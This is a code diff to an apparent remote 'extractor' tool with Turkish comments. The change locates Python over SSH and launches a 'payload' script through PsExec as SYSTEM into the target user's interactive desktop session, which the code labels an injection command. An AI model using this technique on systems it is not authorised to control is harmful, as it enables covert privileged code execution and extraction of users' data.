@@ -64,8 +64,14 @@ class RemoteExtractor:
             session_id = self.get_active_session_id()
             print(f"[{self.host}] Hedef Desktop Session ID: {session_id}")
             
+            # Hedef kullanicinin SSH path'inden Python'un gercek yolunu bul
+            stdin, stdout, stderr = self.ssh.exec_command("where python")
+            python_paths = stdout.read().decode('utf-8', errors='ignore').strip().split('\n')
+            python_exe = python_paths[0].strip() if python_paths and python_paths[0].strip() else "python"
+            print(f"[{self.host}] Python Calistiricisi: {python_exe}")
+            
             # PsExec ile Sesson 0'dan kurtulup hedef kullanicinin ekranina scripti at
-            psexec_cmd = f'cmd.exe /c "set PATH=C:\\PSTools;%PATH% && psexec -i {session_id} -s -accepteula python {payload_remote_path}"'
+            psexec_cmd = f'cmd.exe /c "set PATH=C:\\PSTools;%PATH% && psexec -i {session_id} -s -accepteula \\"{python_exe}\\" {payload_remote_path}"'
             print(f"[{self.host}] PsExec PowerShell Enjeksiyon komutu atiliyor...")
             
             # Asenkron tetikledigimiz icin scriptin bitmesini (dosyalarin uretilmesini) bekle
